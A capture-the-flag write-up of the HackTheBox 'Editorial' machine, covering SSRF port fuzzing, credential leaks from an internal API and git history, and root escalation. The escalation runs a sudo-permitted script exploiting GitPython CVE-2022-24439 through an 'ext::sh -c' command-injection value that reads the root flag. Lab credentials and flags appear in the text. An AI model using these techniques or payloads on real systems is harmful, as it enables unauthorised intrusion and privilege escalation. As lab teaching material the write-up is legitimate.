---
layout: single
title:  "HackTheBox - Editorial"
categories: 
  - HTB Easy
tags:
  - htb
  - htb-easy
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: ""
permalink: /posts/htb-editorial
author_profile: false
sidebar:
  nav: "navbar"
---

## Initial Enumeration

`nmap -sC -sV -v -p- --min-rate=1000 10.10.11.20 -oA nmap/editorial`

```
Nmap scan report for 10.10.11.20
Host is up (0.014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Since a HTTP web server is online, we can try to visit the website and have a look around.

Interestingly, if we click on `Publish with us`, we get a form. This form enables us to insert URLs, as well as upload our own files.

If we try to submit our form and intercept the request in `Burpsuite`, we find that this is a POST request. Our form data is sent in plain text.

* However, as our input form data is not reflected back to us, it is not likely that SSTI will work here.

Additionally, if we try to insert a URL, or upload a file, clicking `Preview` will trigger a POST request.

* We wish to note that the server's response includes a path to a temporary file, generated from our POST request.
* If we upload a file, the response will be a path to our uploaded file, stored on the server-side.
* If we upload a URL (which links to an image), the response is supposed to be a path to the intended image file stored on the server-side. However, we wish to note that invalid URLs result in the server responding with the same `unsplash_photo...` jpeg image.
* This implies that the server simply ingests our provided link/file, downloads it, and  stores it temporarily on the server-side. If the provided URL cannot be resolved, then the server responds with the same default image.

As we have a way to interact with the server, we can try a server-side request forgery (SSRF) approach here.

* Our aim is to make use of the URL form parameter, and fuzz for ports open on the `localhost`. That is, `http://127.0.0.1:FUZZ`.
* We do this to enumerate more services/open ports that may be running on `localhost`.
* The default response that we want to ignore would be the `unsplash_photo` response from the server.

We can fuzz the `localhost` ports using Intruder on `Burpsuite`, or through `ffuf`. I will use `ffuf` here:

`ffuf -request request.txt -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -r -u http://editorial.htb/upload-cover -fs 61`

* `request.txt` contains the raw HTTP request copied from `Burpsuite`.
* We will fuzz the open ports using a word list from `SecLists`.
* Ignore the `unsplash_photo` response, which has a size of 61.

```
 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt
 :: Header           : Host: editorial.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Accept: */*
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Content-Type: multipart/form-data; boundary=---------------------------26481848818702765324104055977
 :: Header           : Origin: http://editorial.htb
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: close
 :: Header           : Referer: http://editorial.htb/upload
 :: Data             : -----------------------------26481848818702765324104055977
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
-----------------------------26481848818702765324104055977
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------26481848818702765324104055977--

 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 61
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 17ms]
:: Progress: [10000/10000] :: Job [1/1] :: 291 req/sec :: Duration: [0:00:28] :: Errors: 2 ::
```

From this, we can see that port 5000 yields a unique response. This means that some service is running internally on the target, on port 5000.

If we submit the POST request using the link `http://127.0.0.1:5000`, we get a response with this path:

`/static/uploads/8509c306-acfa-4aa8-bbff-57dcf096b642`

From our attack host, we can cURL this file:

`curl http://editorial.htb/static/uploads/8509c306-acfa-4aa8-bbff-57dcf096b642`

If we `cat` the file contents and pipe it into `jq`:

```
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

We will find that we have some REST API endpoints available to us now.

## Foothold

Now that we have API endpoints available to us, we can enumerate these endpoints to see if we can get anything of interest.

* Note that these API endpoints are internal, hence we will need to access these endpoints through the same POST method as above.

Here, I attempted to automate the retrieval of responses through `ffuf`, but it wasn't working as expected. Hence, I manually submitted each POST request with each endpoint URL, and manually downloaded each file for viewing.

After some effort, it appears that the only working endpoint is the `authors` endpoint. If we view the response:

```
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

We will find that we have the following credentials: `dev:dev080217_devAPI!@`.

As there is no login feature available on the web page, our next option is to SSH into the server.

Using these credentials, we can SSH as `dev` into the server.

We can obtain the user flag:

```
dev@editorial:~$ cat user.txt 
97a814700de020756f93bf8afb0877f7
```

If we enumerate users using `cat /etc/passwd | grep bash`:

```
root:x:0:0:root:/root:/bin/bash
prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
```

We realise that we have 2 additional users aside from `root`. We have access to `dev`, and our aim now is to try and access `prod`.

If we run `ls` on our home directory, we find an `apps` directory. If we change into the directory and run `ls -la`, we find that `apps` is a Git repository (due to the presence of `.git`). Strangely, we note that the repository is empty.

* We can run thus `git status` and `git log` to figure out the history of the repository.

If we run `git log`, we find that there are some older commits. Crucially, the commit `change(api): downgrading prod to dev` stands out to us, as it implies that the previous repository state contains information that may be crucial for `prod`.

Hence, we can checkout the commit just before it, using `git checkout`. If we review the source code, we find that the `app_api/app.py` script contains `prod` credentials:

```
@app.route(api_route + '/authors/message', methods=['GET'])
def api_mail_new_authors():
    return jsonify({
        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
    }) # TODO: replace dev credentials when checks pass

```

Thus, we now have our `prod` credentials: `prod:080217_Producti0n_2023!@`.

Now, `su` as `prod`. If we run `sudo -l`:

```
User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

We note that `prod` can run `sudo` on this specific Python script. If we review the code, we find that this script simply Git clones from whatever URL we feed in as the argument.

Since Git cloning relies on an external library, we can run `pip3 list` to view the specific library being used.

* Here, we see that `GitPython 3.1.29` is installed.

If we run a quick Google search, we will see that there is a vulnerability for this specific Python library version: CVE-2022-24439.

* Here, we can RCE by passing in a `ext::sh` code call as the repository URL. This is due to improper input sanitisation.
* For example, if we pass in `'ext::sh -c touch% /tmp/pwned'` as the repository URL, a new `pwned` file is created in `/tmp`.

Therefore, to read the root flag, we just need to pass in this command:

`cat% /root/root.txt% >% /tmp/root`

* This command reads the root flag, and writes its contents to `/tmp/root`.

We thus run our command:

`sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'`

Finally, if we `cat /tmp/root`, we will get the root flag.

```
prod@editorial:/opt/internal_apps/clone_changes$ cat /tmp/root
8ec545643dfaf020fe60223c83e306f1
```
